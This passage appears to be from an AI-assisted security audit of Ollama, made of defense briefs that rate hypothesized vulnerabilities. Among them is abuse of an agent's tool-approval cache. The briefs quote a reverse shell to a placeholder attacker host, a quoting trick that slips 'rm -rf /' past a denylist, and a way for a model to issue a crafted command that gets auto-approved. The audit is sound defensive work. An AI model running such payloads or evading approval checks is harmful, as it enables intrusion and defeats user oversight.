**Defense argument:** The `IsPrivate()` gate is only reachable on a loopback-bound server; a remote attacker has to go through 0.0.0.0/external bind (in which case allowedHosts already short-circuits); and a LAN attacker cannot spoof Host to `10.0.0.1` without first reaching loopback. The relevant attack is DNS rebinding where a browser resolves `attacker.com` to 10.x (RFC1918-internal); CORS Origin check then requires the ATTACKER ORIGIN to be in AllowOrigins (it is not). So net effect: only same-origin-already-trusted clients benefit from the RFC1918 allowance, which is consistent with typical dev-environment intent (e.g., a browser on 10.x hitting an Ollama bound 127.0.0.1 via port-forward).

**Verdict recommendation:** Cannot disprove that the check is lenient, but real exploitability is lower than one-liner suggests. MEDIUM at best.

---

### [ADVOCATE] Defense Brief for H-00.10, H-00.11 (zstd double-buffer; ResponsesMiddleware unbounded)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | `maxDecompressedBodySize = 20<<20` (20 MiB) applied to zstd branch | Yes for the decompressed side — total attacker-driven in-memory bytes bounded | `server/cloud_proxy.go:35` |
| Middleware | none | No | n/a |
| Application | For ResponsesMiddleware raw JSON path, io.ReadAll has no cap | No | `middleware/openai.go:511-523` (per hypothesis citation — not re-verified by me) |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: checked — 20 MiB cap exists on decompressed but not raw.
- Pattern 3: checked — gin does not cap bodies by default.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: H-00.10 is distinct from H-00.01 (zstd vs raw path); H-00.11 is distinct OpenAI-compat path.

**Defense argument:** Same as H-00.01 — on default loopback bind, OOM is a local-only DoS (attacker already on box can kill the process directly). `gin.Recovery` reduces the blast radius of an allocator-triggered panic. The 20 MiB cap demonstrates defense-in-depth on the compression branch; the raw-body-path gap is real but latent under the default threat model.

**Verdict recommendation:** Cannot disprove for 0.0.0.0 bind; latent for loopback. MEDIUM.

---

### [ADVOCATE] Defense Brief for H-00.12 (/api/pull with insecure=true + no host allowlist)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | `isValidPart(kindHost)` (`types/model/name.go:344-372`) restricts host to alphanumeric + `.`, `:`, `-`, `_` — no `@`, no `/` inside host. This PREVENTS direct `user:pass@evil.com` userinfo injection but DOES allow `169.254.169.254:80`. | Partial — allows IP literals | `types/model/name.go:344-372` |
| Middleware | allowedHostsMiddleware only covers Host HEADER, not the `model` field | No | n/a |
| Application | `parseAndValidateModelRef` validates model syntax but does not constrain target host beyond isValidPart | No | `server/model_resolver.go:36` |
| Documentation | `insecure=true` is documented in `docs/api.md` without security caveats | N/A — partly documented | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — direct user input to pull.
- Pattern 2: checked — no host allowlist for pull targets.
- Pattern 3: checked — Go http.Client follows the URL scheme the caller gives it.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable (insecure=true is user-set, but required).
- Pattern 7: not applicable.
- Pattern 8: overlap with H-00.02 on the client2 path; H-00.12 is the gin path.

**Defense argument:** `isValidPart(kindHost)` applies `isAlphanumericOrUnderscore` + `.`, `-`, `_`, `:` — this IS a meaningful validator that blocks URL-embedded credential smuggling (e.g., `attacker.com@169.254.169.254`) and path-traversal host tricks. But it does not block IP literals, so IMDS reach is available if `insecure=true` is set AND the user typed a literal metadata-IP as the pull target. The attacker is the user — if a user types `169.254.169.254/evil:tag` with `insecure=true`, they got what they asked for. The threat model "user is tricked by Modelfile FROM directive into pulling from IMDS" is the genuine concern; that requires the user to apply a hostile Modelfile.

**Verdict recommendation:** Cannot disprove for the Modelfile FROM case. MEDIUM (user-in-the-loop required).

---

### [ADVOCATE] Defense Brief for H-00.13 (`extractBashPrefix` splits only on `|`; metachars pass through)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | Go `exec.Command` does NOT invoke a shell by default; `exec.Command("bash", "-c", cmd)` WOULD invoke a shell | Depends on how the tool is actually invoked | need to verify — see bash tool executor |
| Framework | none | No | n/a |
| Middleware | `IsDenied` denylist (`x/agent/approval.go:94-122`) catches `rm -rf`, `sudo `, `curl -X POST`, etc. — BEFORE approval is even prompted. | Partial — catches many common RCE metas but misses `$()`, backticks, `&&` | `x/agent/approval.go:94-122, 173-193` |
| Application | APPROVAL IS STILL REQUIRED on first run — the attacker's maliciously-crafted long command is DISPLAYED TO THE USER verbatim in the selector (`x/agent/approval.go:546-593 formatToolDisplay`). A user who sees `cat tools/file ; bash -i >& /dev/tcp/attacker/4444` has the full string shown and should deny. So the "one approval = session RCE" critique applies ONLY if the user naively approves the visibly-malicious command on first prompt. | Partial — relies on user vigilance | `x/agent/approval.go:551-556` |
| Documentation | Not explicitly documented as a security boundary | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — path exists.
- Pattern 2: checked — `IsDenied` IS a validator; it fires before approval UI on many metachars.
- Pattern 3: checked — N/A.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: related to H-00.14 and H-03.

**Defense argument:** The approval UI shows the FULL command to the user before they choose "Allow once / Allow session / Deny" (`x/agent/approval.go:546-593`). A user confronted with `cat tools/file ; bash -i >& /dev/tcp/attacker/4444` would see the entire shell payload, not just a prefix. The prefix-extraction code at line 204 is used for KEY COMPUTATION (what to remember if user picks "Allow for this session"), not for what gets executed. So the vulnerability is: if user picks "Allow for this session" for a benign-looking command, and the model IMMEDIATELY follows with a malicious variant whose prefix collides, the malicious variant is auto-approved. That requires (a) user approving "session" (not "once"), (b) model issuing a second crafted command within the same session, (c) the metachars not triggering IsDenied. The defense-in-depth via IsDenied catches many common RCE forms.

**Verdict recommendation:** Cannot disprove; this is a real approval-cache abuse primitive. Severity depends on how common "Allow for this session" clicks are — design intent leans toward "use sparingly". The IsDenied list does NOT include `$()`, backticks, or `&&` — so the finding holds. HIGH.

---

### [ADVOCATE] Defense Brief for H-00.14 (command substitution in path generates same approval key)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | `extractBashPrefix` at line 262-268 has a specific guard for `..` traversal that invalidates a prefix when the cleaned path escapes the base. `$(...)` substitutions are NOT recognized. | No for $() specifically | `x/agent/approval.go:252-268` |
| Framework | none | No | n/a |
| Middleware | `IsDenied` does NOT list `$(`, `` ` ``, `&&`, `||`, `;` as deny patterns; only specific dangerous token sequences | No | `x/agent/approval.go:94-122` |
| Application | Approval UI shows full command text | Partial (user vigilance) | `x/agent/approval.go:551-556` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: checked — no substitution detection.
- Pattern 3: checked — not applicable.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: related to H-00.13.

**Defense argument:** Same as H-00.13: user vigilance at approval time is the only meaningful defense. Because `$(...)` is not in deny patterns and is not stripped before prefix extraction, the cache key will effectively match the "benign" base prefix. Only two things stand between this and RCE: user reading the full displayed command and denying, or a future denylist expansion.

**Verdict recommendation:** Cannot disprove. CRITICAL if "Allow for this session" is selected once. The UX pattern where users rapidly click through prompts makes this concerning.

---

### [ADVOCATE] Defense Brief for H-00.15 (--experimental-yolo + denylist raw-string bypass)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | `strings.Contains` with lowercased pattern — quoting tricks like `r''m` do not contain `"rm "` | No | `x/agent/approval.go:176-182` |
| Framework | Yolo mode explicitly skips approval (`x/cmd/run.go:400-402`) — documented as UX fast-path for power users | No — that is exactly the feature | `x/cmd/run.go:159-160` |
| Middleware | `IsDenied` STILL RUNS even in yolo mode (`x/cmd/run.go:375-396`). So a direct `rm -rf /` is still blocked; but `r""m -rf /` (with embedded empty quotes) passes because strings.Contains("r\"\"m -rf /", "rm -rf") is false. | Partial — catches common verbatim patterns; bypass requires deliberate obfuscation. | `x/cmd/run.go:378` |
| Application | At CLI entry (`cmd/cmd.go:2161`): `runCmd.Flags().Bool("experimental-yolo", false, "Skip all tool approval prompts (use with caution)")` — flag name contains "experimental" AND the description warns "use with caution". User has to consciously add `--experimental-yolo`. Banner also printed at run time (`x/cmd/run.go:718-719`: "warning: yolo mode - all tool approvals will be skipped"). | Partial — user was warned | `cmd/cmd.go:2161`, `x/cmd/run.go:718-720` |
| Documentation | No docs/faq mention, but flag description "use with caution" is the doc | N/A — flag-level | `cmd/cmd.go:2161` |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: checked — IsDenied is a real validator that runs; bypasses require quoting tricks.
- Pattern 3: not applicable.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6 (config-as-vuln): MATCH — exploitation requires the user to set `--experimental-yolo`, which is explicitly branded "use with caution" and prints a warning banner. The flag is not default-on; it is an opt-in.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** The user-facing string "experimental-yolo — Skip all tool approval prompts (use with caution)" + the runtime warning banner "warning: yolo mode - all tool approvals will be skipped" is textbook explicit opt-in. This is the design: users who want fast iteration can turn off the guard. The denylist bypasses (quoting tricks) are a secondary concern — in yolo mode, the user has already declared "I accept RCE as the cost of speed". Saying the feature "allows RCE" is accurate but describing a feature, not finding a vuln.

**Verdict recommendation:** Disproved as CRITICAL finding by user-explicit opt-in + warnings. Downgrade to LOW (documentation could be stronger; denylist could be tightened; but these are hardening items, not vulnerabilities).

---

### [ADVOCATE] Defense Brief for H-00.16 (`ensureWebSearchPlugin` shells out to `tar -xzf` → ZipSlip)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | `tar -xzf` with `--strip-components=1` — collapses the top-level directory but does not prevent `../` in nested paths | No for ZipSlip | `cmd/launch/openclaw.go:782` |
| Framework | npm package name is HARDCODED to `@ollama/openclaw-web-search` (`cmd/launch/openclaw.go:742`) — NOT user-controlled, NOT attacker-swappable via config | Partial — forecloses arbitrary package install; attacker must compromise the `@ollama/openclaw-web-search` package on the official npm registry. | `cmd/launch/openclaw.go:742` |
| Middleware | npm fetches via HTTPS by default; MITM requires TLS compromise or bogus `.npmrc` in user env | Partial | n/a |
| Application | Version gate (`webSearchPluginUpToDate`) — if the currently installed plugin meets `webSearchMinVersion`, no re-install happens. Skip path prevents re-install every launch. | Partial — doesn't guard the first-run install itself | `cmd/launch/openclaw.go:794-806` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — first-launch reaches the code path.
- Pattern 2: checked — no sha256 pinning; trusts npm registry + TLS.
- Pattern 3: checked — `tar` is GNU tar; no `--no-same-permissions` or `--no-absolute-names` used. The `--strip-components=1` does NOT prevent slip.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** Attacker must control the `@ollama/openclaw-web-search` npm package to plant a malicious tarball — this requires compromising an `@ollama`-scoped package on the npmjs.org registry (a high-bar supply-chain attack against Ollama the organization). HTTPS + npm's registry integrity (package-lock sha pinning, if used) provide defense in depth. The ZipSlip itself (tar writing outside the destination directory) is real, but the upstream trust fence is high. An "npmjs.com compromise" caveat applies to every project pulling from npm at install time.

**Verdict recommendation:** Cannot disprove the ZipSlip primitive, but the preconditions (compromise of the Ollama-maintained npm package) are very high. Degrade from CRITICAL to HIGH. Worth hardening with `filepath.Clean` + absolute-path check post-extract, or `tar --no-absolute-names --no-same-permissions`.

---

### [ADVOCATE] Defense Brief for H-00.17 ($VISUAL/$EDITOR parsed with strings.Fields → exec.Command)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | `exec.Command(args[0], args[1:]...)` uses execve-style invocation — no shell interpretation | No (this is actually PROTECTION for metachar injection, but attacker is injecting flag-style args) | n/a |
| Framework | none | No | n/a |
| Middleware | none | No | n/a |
| Application | $EDITOR is by convention user-configured. A process with `EDITOR="code --extensionDevelopmentPath=/tmp/evil"` has already been modified by the user (or their shell rc). No attacker controls env unless they already have local code exec. | Yes — attacker must already own env to set EDITOR | general Unix semantics |
| Documentation | $EDITOR semantics are OS-standard; no specific doc needed | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: checked.
- Pattern 3: not applicable.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6 (config-as-vuln): MATCH — exploitation requires attacker to CONTROL $EDITOR in the victim's environment. Setting an env var is not a remote attack primitive; it requires either local code exec, shell rc tampering, or social engineering via `ollama` launch scripts.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** $EDITOR/$VISUAL is part of the user's inherited shell environment. Modifying it requires attacker-controlled shell rc or local code exec — both of which already imply full host compromise by different means. The `strings.Fields + exec.Command` pattern is standard Unix practice (git, vim, many tools do the same). This is not a vulnerability; it is standard $EDITOR semantics.

**Verdict recommendation:** Disproved as vuln by Pattern 6. Attack requires prior attacker control of environment. HIGH → NOT-A-VULN or INFORMATIONAL.

---

### [ADVOCATE] Defense Brief for H-00.19 (`id_ed25519` loaded with no mode/owner/symlink check)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | Go `os.ReadFile` follows symlinks and does not check perms — standard | No | n/a |
| Framework | none | No | n/a |
| Middleware | Key file is created under `~/.ollama/` which is user-home — conventional UNIX perms (0700 for home, 0600 for key) apply | Partial — depends on OS umask + home dir permissions | n/a |
| Application | `auth` package presumably creates the key with restrictive mode (not verified yet by me) | Need Tracer confirmation | n/a |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: checked.
- Pattern 3: not applicable.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** In typical Unix deployments `~/.ollama/` is created under the user's home dir with umask 022 (so file 0644 / dir 0755); an attacker who can symlink INTO `~/.ollama/id_ed25519` would need write access to that directory — which means they are either the same user (already a full compromise) or root (who can read the file directly). Multi-user servers with shared home directory permissions are unusual and violate standard Unix conventions. The "world-readable" scenario requires the user to have explicitly loosened perms — a pattern-6 config issue.

**Verdict recommendation:** Cannot fully disprove. The code SHOULD do an `os.Stat` + mode check as belt-and-suspenders (a la OpenSSH's refusal to load world-readable private keys). Hardening worth raising at MEDIUM severity.

---

### [ADVOCATE] Defense Brief for H-00.22 / H-06 (SQL injection in `app/store/database.go:64`)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | `fmt.Sprintf` at `app/store/database.go:64` substitutes `%d` (currentSchemaVersion, an int constant) into a DDL schema — no attacker-controlled input reaches this Sprintf | **Yes — this is not a SQL-injection sink** | `app/store/database.go:64-152` |
| Framework | Go `database/sql` driver with `?` placeholder for all INSERT/UPDATE queries used elsewhere | Yes for all actual row operations | `app/store/database.go` and siblings |
| Middleware | `isValidPart` blocks SQL metachars in model names (no apostrophe, no semicolon, no space) | Yes for model-name-derived paths | `types/model/name.go:344-372` |
| Application | `app/store` is compiled ONLY on darwin/windows (`//go:build windows || darwin` at `app/store/database.go:1`) — the entire file does not compile on Linux | Yes — platform gate | `app/store/database.go:1` |
| Documentation | n/a | n/a | n/a |

**Claude FP Pattern Check:**
- Pattern 1 (no path trace): **MATCH** — the hypothesis asserts user-controlled input reaches `fmt.Sprintf` at line 64; my reading shows the only substitution is `currentSchemaVersion` (an integer CONSTANT). No untrusted data reaches this Sprintf.
- Pattern 2: not applicable.
- Pattern 3: not applicable.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable — app/store is production UI code.
- Pattern 8: not applicable.

**Defense argument:** I read `app/store/database.go:64-152`. The `fmt.Sprintf` formats a CREATE TABLE DDL with a SINGLE integer format specifier (`schema_version INTEGER NOT NULL DEFAULT %d`) substituted with the constant `currentSchemaVersion = 16`. No user input is involved. The rest of the file (checked with Grep) uses parameterized `?` placeholders for row operations. Additionally, the build tag `//go:build windows || darwin` means this file is not part of Linux builds. Even if a Sprintf row-insertion existed elsewhere and were reached by `/api/pull`, the model name is validated by `isValidPart` which rejects apostrophe and every other SQL metachar. The chain H-06 also requires OLLAMA_HOST=0.0.0.0 (H-00.08) AND a shared DB AND the name validator to allow SQL metachars — none of the predicates hold.

**Verdict recommendation:** DISPROVED by Pattern 1 (no attacker-input path to this Sprintf) + `isValidPart` validation + build-tag platform gate. H-00.22 and H-06 should be retired as FALSE POSITIVES.

---

### [ADVOCATE] Defense Brief for H-00.24 (auth challenge body unbounded io.ReadAll)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | Go GC / OOM | No | n/a |
| Framework | none — gin not involved on client-side | No | n/a |
| Middleware | none | No | n/a |
| Application | The only caller is `getAuthorizationToken` under `/api/pull`; attacker-controlled registry is required | Partial — requires malicious registry | `server/auth.go:53-100` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — path is direct.
- Pattern 2: checked — no cap.
- Pattern 3: checked.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: distinct from /api/cloud_proxy unbounded (server-side).

**Defense argument:** The attacker must persuade the victim to pull from an attacker-controlled registry (Modelfile FROM directive, typo-squat, or user command). Ollama pull is user-initiated — a user choosing to trust an arbitrary registry has already accepted some compromise. The client-side OOM is one resource-exhaustion outcome of that trust decision; it does not cross a privilege boundary (client is ollama pulling on user's behalf). Defense-in-depth would be to wrap with `io.LimitReader` capped at ~5 MiB (token endpoints return short JSON).

**Verdict recommendation:** Cannot disprove — legitimate hardening gap. MEDIUM — user-opt-in to malicious registry required.

---

### [ADVOCATE] Defense Brief for H-01 (full remote identity theft chain)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | CORS: `envconfig.AllowedOrigins()` does NOT include `*.localhost`, `*.local`, `*.internal`. For JSON POST to `/api/experimental/web_search`, browser preflights; preflight fails (no matching Allow-Origin). | Yes for browser-drive-by with JSON content-type | `envconfig/config.go:85-109` |
| Middleware | allowedHostsMiddleware suffix match `.localhost` (line 1599-1602) — passes | No — attack assumes this | `server/routes.go:1599-1602` |
| Application | `signinURL()` is constant — cannot be poisoned by attacker (invalidates H-07-derived step of chain) | Yes for signin_url step | `server/routes.go:59, 183-192` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — chain is lengthy.
- Pattern 2: **MATCH** — Hypothesis underestimates CORS. `/api/experimental/web_search` accepts `application/json` POST, which triggers preflight. Browser preflight OPTIONS request returns without a matching Access-Control-Allow-Origin (because `http://pwn.localhost:11434` is not in AllowOrigins — the list is `localhost`, `127.0.0.1`, `0.0.0.0`, NOT `*.localhost`). Preflight fails, browser blocks the POST. This invalidates the drive-by portion of CHAIN-A.
- Pattern 3: checked — gin CORS is real framework protection.
- Pattern 4: checked — chain spans origins by design (cross-origin).
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: superset of H-00.03 + H-00.04 + H-00.06 + H-00.19 + H-00.21.

**Defense argument:** Let me re-read AllowedOrigins (`envconfig/config.go:85-109`): the emitted list is exactly `http://localhost, https://localhost, http://localhost:*, ... http://127.0.0.1, ... http://0.0.0.0, ...` (no wildcard for `*.localhost`). `corsConfig.AllowWildcard = true` (`server/routes.go:1648`) allows `*` IN the configured origin strings (so `http://localhost:*` matches any port) but does NOT automatically wildcard subdomains. Per the gin-contrib/cors semantics, `http://pwn.localhost:11434` is NOT matched by `http://localhost` or `http://localhost:*` — different hostnames. Therefore the BROWSER-side CSRF portion of CHAIN-A (drive-by web page → JSON POST to `/api/experimental/web_search` with Host `pwn.localhost:11434`) is blocked by the CORS preflight failure.

Secondary defense: `signinURL()` is a compile-time constant pointing at `https://ollama.com/connect?...` and is NOT attacker-controllable — the realm-downgrade leg also fails to produce a phishing URL.

**Verdict recommendation:** DISPROVED by CORS preflight failure for JSON POST drive-bys. The chain could re-materialize via (a) browser extension in AllowOrigins, (b) a same-origin attacker already on loopback, (c) OLLAMA_HOST=0.0.0.0 with a LAN attacker. But the "any webpage victim visits" framing fails. Downgrade from CRITICAL to MEDIUM.

---

### [ADVOCATE] Defense Brief for H-02 (npm pack stdout → tar flag injection)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | Go `exec.Command` passes each argv element directly to `execve` on POSIX — no shell interpretation, no word-splitting on the receiving side. A newline in `tgzPath` becomes a literal newline in argv[3] — tar sees it as a filename with a newline, NOT as a separate flag. | Yes for newline injection on POSIX | `cmd/launch/openclaw.go:779, 782`; Go `os/exec` semantics |
| Framework | npm package name is a hardcoded Ollama-scoped package; attacker cannot swap the package without compromising the npm scope. | Partial | `cmd/launch/openclaw.go:742` |
| Middleware | `strings.TrimSpace` strips leading and trailing whitespace including newlines | Partial — only strips outer whitespace; embedded newlines preserved | `cmd/launch/openclaw.go:778` |
| Application | `filepath.Join(pluginDir, tgzName)` — if `tgzName` contains `/`, filepath.Join normalizes; on POSIX `..` is NOT collapsed unless you call filepath.Clean (filepath.Join does call Clean internally). | Partial | `cmd/launch/openclaw.go:779` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: checked — TrimSpace covers most whitespace cases.
- Pattern 3: **MATCH** — Go's `exec.Command` uses `execve(2)` on POSIX which does NOT reinterpret argument strings. A newline inside a single argv element is NOT a shell metacharacter to a program invoked via exec.Command. The hypothesis's central claim "`A.tgz\n--checkpoint-action=...` gets interpreted as two tar args" is incorrect on POSIX; the entire string is argv[3], a single filename containing a newline — tar will look for that file and fail. On Windows, argv is reconstructed via CommandLineToArgvW from a quoted command line — Go's exec.Command on Windows does NOT naively concatenate; it quotes args per CommandLineToArgvW rules, so embedded newline in one arg stays in one arg.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: distinct from H-00.16.

**Defense argument:** The Go exec.Command semantics neutralize the claimed newline-splits-into-two-flags primitive. Secondary concern: a filename starting with `-` might be interpreted as a flag by tar. But `filepath.Join(pluginDir, tgzName)` prepends `pluginDir` (a known-safe path), so the final path passed to tar is `<pluginDir>/<tgzName>` — the first character of the argv is `<pluginDir>[0]`, not `-`. Even if `tgzName` starts with `--foo`, the full argv is `<pluginDir>/--foo` which does not start with `-`.

Tertiary concern: what if `tgzName` contains a `/` or `..`? filepath.Join will normalize a `../`-style traversal — this could resolve outside pluginDir. But this only affects WHERE tar is asked to read the archive; it does not cause tar to exec arbitrary commands. The attacker would at best get `tar xzf /etc/passwd` which tar would reject as not-a-tar-archive.

**Verdict recommendation:** Largely disproved by exec.Command argv semantics (Pattern 3). The residual concern is a filename starting with `-` when pluginDir is somehow empty — but `os.MkdirAll(pluginDir, ...)` and `filepath.Join` guarantee a non-empty prefix. Downgrade from CRITICAL to LOW.

---

### [ADVOCATE] Defense Brief for H-03 (approval cache collision: sed -n vs sed -i)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | none | No | n/a |
| Middleware | `IsDenied` does not catch `sed -i` | No | `x/agent/approval.go:94-122` |
| Application | `extractBashPrefix` at line 252-268 checks for `..` traversal and rejects prefix if cleaned path escapes base | Partial — the guard at line 256 `if strings.HasPrefix(cleaned, "..")` AND the sibling-base check at line 262-268 blocks `tools/../../.zshrc` because cleaned prefix path base would NOT equal `tools`. The guard IS in place — re-read `approval.go:262-268`: "if original had '..', verify cleaned path didn't escape to sibling". `tools/../../.zshrc` → cleaned = `../.zshrc` → begins with `..` → prefix extraction returns empty string → no cache hit → approval REQUIRED. | Yes for the specific escape path claimed | `x/agent/approval.go:252-268` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: **MATCH PARTIAL** — the hypothesis's specific example path (`tools/../../.zshrc`) is caught by the traversal guard at line 256 `if strings.HasPrefix(cleaned, "..") { return "" }`. That guard returns empty prefix → approval is re-requested. Hypothesis overstates the gap.
- Pattern 3: not applicable.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: related to H-00.13.

**Defense argument:** Let me re-read `x/agent/approval.go:252-268` carefully:

```go
cleaned := path.Clean(arg)
// Security: reject if cleaned path escapes to parent directory
if strings.HasPrefix(cleaned, "..") {
    return "" // Path escapes - don't create prefix
}
// Security: if original had "..", verify cleaned path didn't escape to sibling
if strings.Contains(arg, "..") {
    origBase := strings.SplitN(arg, "/", 2)[0]
    cleanedBase := strings.SplitN(cleaned, "/", 2)[0]
    if origBase != cleanedBase {
        return "" // Path escaped to sibling directory
    }
}
```

For `tools/../../.zshrc`: cleaned = `../.zshrc`. `strings.HasPrefix("../.zshrc", "..")` → true → return "" → no prefix → approval REQUIRED. Good.

For the flag collision (`-i` vs `-n`): the hypothesis is correct that flags are stripped from the prefix key (line 233: `if strings.HasPrefix(arg, "-") { continue }`). `sed -n` and `sed -i` produce the same cache key `sed:tools/`. So a user who approves "sed for this session on tools/" ALSO approves `sed -i` on tools/ — a privilege that includes in-place modification. This IS the real bug.

However: the scope is LIMITED to files inside `tools/`. A malicious `sed -i` could only modify files the user already whitelisted sed-access to for the session. Modifying `$HOME/.zshrc` would require the user to have approved `sed:~/` or similar, which the extraction logic fights (line 364-369: home expansion triggers the outside-cwd warning).

**Verdict recommendation:** Partially cannot disprove for files INSIDE the approved prefix directory — this is a real cache-granularity issue (read-flag vs write-flag same key). The specific `$HOME/.zshrc` attack in the hypothesis is blocked by the `..`-traversal guard. Downgrade from CRITICAL to MEDIUM.

---

### [ADVOCATE] Defense Brief for H-04 (SSE streaming hijack; XSS into browser extension)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | CORS with `AllowWildcard = true, AllowBrowserExtensions = true`, AllowOrigins from `envconfig.AllowedOrigins()`. The wildcard flag enables `:*` port wildcards, not subdomain wildcards. | Partial | `server/routes.go:1648-1672` |
| Middleware | cloud_proxy forwards bytes — does not sanitize SSE payloads | No | `server/cloud_proxy.go` |
| Application | Upstream is HTTPS-pinned to `ollama.com:443` via `defaultCloudProxyBaseURL`; attacker must control ollama.com, MITM TLS, or exploit a distinct input path | Partial | `server/cloud_proxy.go:27-29` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: checked.
- Pattern 3: checked — CORS is operative but doesn't sanitize content.
- Pattern 4 (same-origin): MATCH — any browser extension / webview with origin in the CORS allowlist can already do everything the XSS would do (direct API calls). The XSS "achievement" does not increase attacker capability beyond what the allowlist already grants.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: response-side twist on H-00.01.

**Defense argument:** For the XSS to matter, the rendering context must be a webview or extension that's ALREADY in AllowOrigins (`app://`, `file://`, `tauri://`, `vscode-webview://`, `vscode-file://`). Any such context can already make direct calls to `http://localhost:11434/api/*` — the CORS list grants it. The "XSS'd" data does not grant NEW capabilities; it grants capabilities the UI already has. Additionally, upstream is HTTPS-pinned to ollama.com; attacker must compromise ollama.com itself or MITM a TLS connection. The user's local daemon is only a passthrough pipe; no new trust boundary is crossed.

**Verdict recommendation:** Mostly disproved by same-origin analysis. The XSS is a real defect if it exists (undocumented content-type handling), but the impact is dwarfed by already-granted API access. Downgrade from HIGH to LOW.

---

### [ADVOCATE] Defense Brief for H-05 (concurrent approval race — TOCTOU on approvedPrefixes map)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | Go `sync.RWMutex` guards the map (`x/agent/approval.go:142 mu sync.RWMutex`). All read/write operations through `IsAllowed`, `AddToAllowlist`, `Reset`, `AllowedTools` take the appropriate lock. | Yes — map reads/writes are mutex-protected | `x/agent/approval.go:138-150, 389-423, 461-478, 974-979, 982-993` |
| Framework | none | No | n/a |
| Middleware | none | No | n/a |
| Application | `AddToAllowlist` is called only AFTER the user selects "Allow for this session" (`x/cmd/run.go:427-428`). There is NO optimistic cache write before user consent. | Yes | `x/cmd/run.go:427-428` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked.
- Pattern 2: **MATCH** — the hypothesis speculates "approval store is a Go map without sync". The actual implementation at line 142 uses `sync.RWMutex` with proper locking around all map operations. Additionally, `AddToAllowlist` is called post-approval-decision, not optimistically pre-emptive.
- Pattern 3: checked.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** `ApprovalManager` is thread-safe (sync.RWMutex at line 142). The tool-call dispatch loop in `x/cmd/run.go:370-434` processes calls one at a time in a `for` loop — there is no goroutine-per-tool-call fan-out visible in the code path I read. Even if concurrency were introduced, the mutex-protected map + "write only on user consent" pattern prevents the specific TOCTOU described.

